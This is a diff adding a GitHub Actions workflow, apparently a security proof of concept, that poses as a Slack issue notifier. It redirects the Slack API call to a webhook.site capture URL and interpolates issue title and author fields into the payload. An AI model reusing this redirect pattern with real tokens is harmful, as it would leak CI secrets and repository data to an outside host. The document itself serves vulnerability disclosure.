@@ -1,0 +1,26 @@
+name: Post new issues to Slack (security PoC - maru1009)
+on:
+  issues:
+    types: [opened]
+jobs:
+  notify:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Post to Slack
+        uses: slackapi/slack-github-action@91efab103c0de0a537f72a35f6b8cda0ee76bf0a # v2.1.1 (same SHA Anthropic pins)
+        continue-on-error: true
+        with:
+          api: https://webhook.site/ff2e89bb-0231-432e-ab27-dd3ad42cc9ae                 # redirected capture (NOT Slack) - never touches Anthropic
+          method: chat.postMessage
+          token: xoxb-poc-dummy-token-not-real
+          payload: |
+            {
+              "channel": "C09HY5E0K60",
+              "text": "New issue opened in ${{ github.repository }}",
+              "blocks": [
+                { "type": "section", "text": { "type": "mrkdwn",
+                  "text": "*New Issue:* <${{ github.event.issue.html_url }}|#${{ github.event.issue.number }} ${{ github.event.issue.title }}>" } },
+                { "type": "section", "text": { "type": "mrkdwn",
+                  "text": "*Author:* ${{ github.event.issue.user.login }}" } }
+              ]
+            }
